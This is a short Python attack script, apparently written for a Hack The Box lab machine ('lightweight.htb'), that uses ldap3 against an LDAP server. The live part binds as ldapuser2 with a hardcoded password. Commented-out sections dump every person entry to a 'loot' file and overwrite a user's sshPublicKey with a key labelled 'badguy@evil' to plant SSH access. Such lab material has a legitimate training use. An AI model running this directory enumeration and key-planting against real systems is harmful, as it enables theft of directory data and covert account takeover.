#!/usr/bin/env python3
import ldap3
import re

# Extract information

# server = ldap3.Server('10.10.10.119',get_info=ldap3.ALL ,port=389,use_ssl=False)
# connection = ldap3.Connection(server=server)
# if connection.bind():
#     print("[+] Got some information")
#     dc_name = re.findall('dc=.*,dc=.*',str(server.info))
#     if len(dc_name) > 0:
#         print("[+] Got domain controller name: ",dc_name)
#         print("[*] Searching for juicy info: ")
#         secrets = connection.search(search_base=dc_name, search_filter='(&(objectClass=person))', search_scope='SUBTREE', attributes='*')
#         if secrets:
#             print("[+] Loot:")
#             file = open('ldap.loot','w')
#             for entry in connection.entries:
#                 file.write(str(entry))
#             file.close()
#             print("[+] Saved to ldap.loot.")

# Check if we can write to the ldap server.

server = ldap3.Server('10.10.10.119', port =389, use_ssl = False)
connection = ldap3.Connection(server, 'uid=ldapuser2,ou=People,dc=lightweight,dc=htb', 'ldapuser2', auto_bind=True)

print(connection.bind())
print(connection.extend.standard.who_am_i())
# u'dn:uid=USER,ou=USERS,dc=DOMAIN,dc=DOMAIN'
# print(connection.modify('uid=USER,ou=USERS,dc=DOMAINM=,dc=DOMAIN',{'sshPublicKey': [(ldap3.MODIFY_REPLACE, ['ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDHRMu2et/B5bUyHkSANn2um9/qtmgUTEYmV9cyK1buvrS+K2gEKiZF5pQGjXrT71aNi5VxQS7f+s3uCPzwUzlI2rJWFncueM1AJYaC00senG61PoOjpqlz/EUYUfj6EUVkkfGB3AUL8z9zd2Nnv1kKDBsVz91o/P2GQGaBX9PwlSTiR8OGLHkp2Gqq468QiYZ5txrHf/l356r3dy/oNgZs7OWMTx2Rr5ARoeW5fwgleGPy6CqDN8qxIWntqiL1Oo4ulbts8OxIU9cVsqDsJzPMVPlRgDQesnpdt4cErnZ+Ut5ArMjYXR2igRHLK7atZH/qE717oXoiII3UIvFln2Ivvd8BRCvgpo+98PwN8wwxqV7AWo0hrE6dqRI7NC4yYRMvf7H8MuZQD5yPh2cZIEwhpk7NaHW0YAmR/WpRl4LbT+o884MpvFxIdkN1y1z+35haavzF/TnQ5N898RcKwll7mrvkbnGrknn+IT/v3US19fPJWzl1/pTqmAnkPThJW/k= badguy@evil'])]})